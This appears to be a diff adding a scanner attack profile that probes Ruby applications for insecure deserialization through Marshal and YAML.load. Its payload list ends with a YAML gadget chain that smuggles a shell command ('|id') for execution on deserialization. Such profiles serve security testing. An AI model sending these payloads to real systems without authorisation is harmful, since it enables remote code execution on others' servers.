@@ -1,0 +1,28 @@
+# Insecure Deserialization Attack Profile for Ruby
+name: "Ruby Deserialization"
+category: "deserialization"
+severity: "critical"
+description: "Tests for insecure deserialization vulnerabilities in Ruby using Marshal and YAML.load"
+supported_languages:
+  - "ruby"
+target_fields:
+  - "data"
+  - "state"
+  - "object"
+  - "serialized"
+  - "payload"
+  - "session"
+success_indicators:
+  - "ArgumentError:"
+  - "TypeError:"
+  - "syntax error"
+  - "undefined class/module"
+payloads:
+  # Ruby Marshal (empty array)
+  - "BAhbAA=="
+  # Ruby Marshal object
+  - "\x04\x08o:\x0bObject\x00"
+  # YAML.load (unsafe)
+  - "--- !ruby/object:Gem::Installer\n    i: x\n"
+  # ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy universal gadget (via ysoserial or similar)
+  - "--- !ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\n  instance: !ruby/object:ActiveSupport::TimeZone\n    name: \"|id\\\"\"\n  method: :name\n  var: \"@name\"\n"
